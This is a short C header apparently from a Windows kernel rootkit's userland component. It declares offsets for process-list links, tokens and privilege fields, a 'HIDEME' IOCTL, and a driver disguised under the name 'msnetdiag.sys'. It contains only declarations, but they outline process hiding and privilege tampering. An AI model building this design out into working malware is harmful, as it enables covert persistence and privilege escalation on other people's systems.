#pragma once

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//#define LOG_OFF


typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned char BYTE;
typedef struct offset {
	BOOL isSupported;
	DWORD ProcPID;
	DWORD ProcName;
	DWORD ProcLinks;
	DWORD DriverSection;
	DWORD Token;
	DWORD nSIDS;
	DWORD PrivPresent;
	DWORD PrivEnable;
	DWORD PrivDefaultEnable;
}offset;


#define FILE_DEVICE_RK 0x00008001
#define STATUS_OS_NOT_SUPPORT -1;
#define IOCTL_TEST_HIDEME CTL_CODE(FILE_DEVICE_RK,0x801,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)
#define DIRVER_FILE_NAME "msnetdiag.sys"
#define DRIVER_NAME "msnetdiag"
#define STATUS_FAILED -1

const char UserlandPath[] = "\\\\.\\msnetdiag";